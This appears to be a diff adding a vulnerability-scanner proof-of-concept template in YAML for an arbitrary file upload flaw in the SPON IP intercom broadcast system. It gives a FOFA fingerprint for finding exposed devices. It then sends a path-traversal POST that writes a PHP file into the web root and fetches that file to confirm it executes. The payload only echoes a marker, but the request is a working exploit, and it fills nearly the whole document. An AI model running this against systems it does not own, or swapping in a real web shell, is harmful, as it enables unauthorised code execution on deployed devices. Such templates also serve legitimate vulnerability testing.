@@ -1,0 +1,25 @@
+id: poc-yaml-spon-busyscreenshotpush-php-anyfile-upload
+info:
+  name: 世邦通信SPON-IP网络对讲广播系统 busyscreenshotpush.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 任意写入
+  finger: IP网络对讲广播系统
+  fofa: icon_hash="-1830859634"
+variables:
+  filename: to_lower(random_str(10))
+  content: base64("<?php echo 'vulnerability';?>")
+requests:
+- method: POST
+  path: /php/busyscreenshotpush.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'jsondata[caller]=1&jsondata[callee]=../../../../../ICPAS/Wnmp/WWW/php/&jsondata[imagename]=1_2_{{.filename}}.php&jsondata[imagecontent]={{.content}}
+
+    '
+  expression: "status_code == 200 && \ncontains(body,\"upload\") &&\ncontains(body,\"\
+    success\")\n"
+- method: GET
+  path: /php/1_2_{{.filename}}.php
+  expression: "status_code == 200 && \ncontains(body,\"vulnerability\")\n"
+transport: http
